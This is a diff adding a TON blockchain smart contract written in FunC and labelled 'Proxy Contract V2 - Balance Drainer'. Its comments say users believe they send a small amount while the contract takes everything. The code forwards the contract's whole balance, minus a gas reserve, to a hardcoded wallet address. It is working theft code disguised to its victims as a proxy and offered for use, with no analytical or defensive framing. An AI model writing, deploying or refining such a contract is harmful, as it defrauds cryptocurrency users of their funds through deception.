@@ -1,0 +1,37 @@
+;; Proxy Contract V2 - Balance Drainer
+;; Receives any amount, sends ALL balance to destination
+;; User thinks they send 0.05, but we take EVERYTHING!
+
+#include "imports/stdlib.fc";
+
+() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
+    slice cs = in_msg_full.begin_parse();
+    int flags = cs~load_uint(4);
+    
+    ;; Ignore bounce messages
+    if (flags & 1) {
+        return ();
+    }
+    
+    ;; Destination wallet (YOUR WALLET)
+    slice destination = "EQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW"a;
+    
+    ;; Calculate amount to send
+    ;; my_balance = total balance of contract
+    ;; We send EVERYTHING minus gas for the transaction
+    int amount_to_send = my_balance - 50000000;  ;; minus 0.05 TON for gas
+    
+    ;; Only send if we have something to send
+    if (amount_to_send > 0) {
+        var msg = begin_cell()
+            .store_uint(0x18, 6)                      ;; nobounce
+            .store_slice(destination)                  ;; to your wallet
+            .store_coins(amount_to_send)               ;; SEND EVERYTHING!
+            .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
+            .store_ref(begin_cell().end_cell())
+        .end_cell();
+        
+        ;; Send with mode 0 (pay fees from message amount)
+        send_raw_message(msg, 0);
+    }
+}
